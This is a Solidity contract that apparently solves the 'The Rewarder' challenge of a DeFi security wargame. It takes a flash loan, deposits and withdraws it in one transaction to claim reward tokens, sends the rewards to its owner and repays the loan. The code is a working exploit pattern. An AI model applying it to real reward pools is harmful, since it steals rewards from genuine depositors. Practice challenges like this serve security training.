import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "hardhat/console.sol";
import "../DamnValuableToken.sol";

contract AttackerReward {
     uint256 public _amount = 1000000 ether;
    FlashLoanerPool immutable flashLoanerPool;
    TheRewarderPool immutable theRewarderPool;
    DamnValuableToken public immutable liquidityToken;
    RewardToken public immutable rewardToken;
    address private owner;

    constructor (address _flashLoanerPool, address _theRewarderPool, address _liquidityToken, address _rewardToken){
        flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
        theRewarderPool = TheRewarderPool(_theRewarderPool);
        liquidityToken = DamnValuableToken(_liquidityToken);
        rewardToken = RewardToken(_rewardToken);
        owner = msg.sender;
    }

    function flashloanattack() external{
        flashLoanerPool.flashLoan(liquidityToken.balanceOf(address(flashLoanerPool)));
    }

    function receiveFlashLoan (uint256 _amount) external{

        liquidityToken.approve(address(theRewarderPool), _amount);
        theRewarderPool.deposit(_amount);
        theRewarderPool.withdraw(_amount);
        uint balanceAttacker = rewardToken.balanceOf(address(this));
        rewardToken.transfer(owner, balanceAttacker);
        liquidityToken.transfer(address(flashLoanerPool), _amount);


    }

}